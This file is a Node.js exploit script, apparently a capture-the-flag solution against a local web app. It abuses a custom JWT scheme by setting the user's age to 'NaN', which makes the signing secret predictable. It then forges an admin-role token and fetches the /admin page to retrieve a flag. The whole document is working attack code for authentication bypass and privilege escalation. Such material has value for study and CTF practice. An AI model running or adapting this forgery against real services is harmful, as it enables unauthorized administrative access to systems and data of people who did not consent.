const axios = require('axios');
const crypto = require('crypto');
const querystring = require('querystring');

// Server URL
const url = 'http://localhost:3000';

// User credentials
const username = 'your_username';
const password = 'your_password';

// Function to create signature
function createSignature(payload, secret) {
    return crypto.createHmac('sha256', secret).update(payload).digest('hex');
}

// Function to sign JWT
function customJwtSign(data, secret) {
    const payload = JSON.parse(Buffer.from(data, 'base64').toString());
    const timestamp = payload.timestamp;
    const pl = Buffer.from(JSON.stringify(payload)).toString('base64');
    const superSecret = (secret ^ timestamp) + parseFloat(payload.age);
    const signature = createSignature(`${pl}:${superSecret}`, '');
    return `${signature}`;
}

// Function to forge JWT
function customJwtForge(payload, role) {
    let newToken = Buffer.from(payload.split('.')[0], 'base64').toString();
    newToken = newToken.replace(/"age":"[^"]+"/, '"age":"NaN"');
    newToken = newToken.replace(/"role":"[^"]+"/, `"role":"${role}"`);
    newToken = Buffer.from(newToken).toString('base64');
    const signature = customJwtSign(newToken, 1337);
    const forgedPayload = newToken.replace(/=/g, '%3d');
    return `${forgedPayload}.${signature}`;
}

// Extract the token from cookies
function getTokenFromCookies(cookies) {
    const tokenCookie = cookies.find(cookie => cookie.startsWith('token='));
    if (!tokenCookie) {
        throw new Error('Token cookie not found');
    }
    return decodeURIComponent(tokenCookie.split('=')[1]);
}

// Register and login to get a valid token
async function runExploit() {
    const session = axios.create({
        withCredentials: true
    });

    // Register
    let response = await session.post(`${url}/register`, querystring.stringify({
        username: username,
        password: password,
        nickname: 'nickname',
        age: '25',
        interests: 'interests'
    }));

    let token = '';
    let cookies = response.headers['set-cookie'].filter(cookie => !cookie.startsWith('connect.sid'));
    try {
        token = getTokenFromCookies(cookies);
    } catch (e) {
        console.log('Failed to register');
        // log response text
        console.log(response.data);
    }
    console.log(`Original Token: ${token}`);

    // Decode the original token
    let [payload, signature] = token.split('.');
    let payloadJson = JSON.parse(Buffer.from(payload, 'base64').toString());

    // Update profile to set the age to a non-numerical value
    response = await session.post(`${url}/update-profile`, querystring.stringify({
        username: username,
        password: password,
        nickname: 'nickname',
        age: 'NaN',
        interests: 'interests'
    }), {
        headers: {
            Cookie: `token=${encodeURIComponent(token)}`
        }
    });

    console.log(response.data);

    if (response.status !== 200) {
        console.log('Failed to update profile');
        return;
    }

    // Login again to get a new token
    response = await session.post(`${url}/login`, querystring.stringify({
        username: username,
        password: password
    }));

    cookies = response.headers['set-cookie'].filter(cookie => !cookie.startsWith('connect.sid'));
    let newToken = getTokenFromCookies(cookies);
    console.log(`New Token: ${newToken}`);

    // Forge the token with the modified payload
    let forgedToken = customJwtForge(newToken, 'admin');
    console.log(`Forged Token: ${forgedToken}`);

    // Send the forged token to the server
    session.defaults.headers.Cookie = `token=${forgedToken}`;
    response = await session.get(`${url}/admin`);

    if (response.data.toLowerCase().includes('flag')) {
        console.log('Exploit successful! Admin page accessed.');
    } else {
        console.log('Exploit failed.');
    }

    console.log(response.data);
}

runExploit();
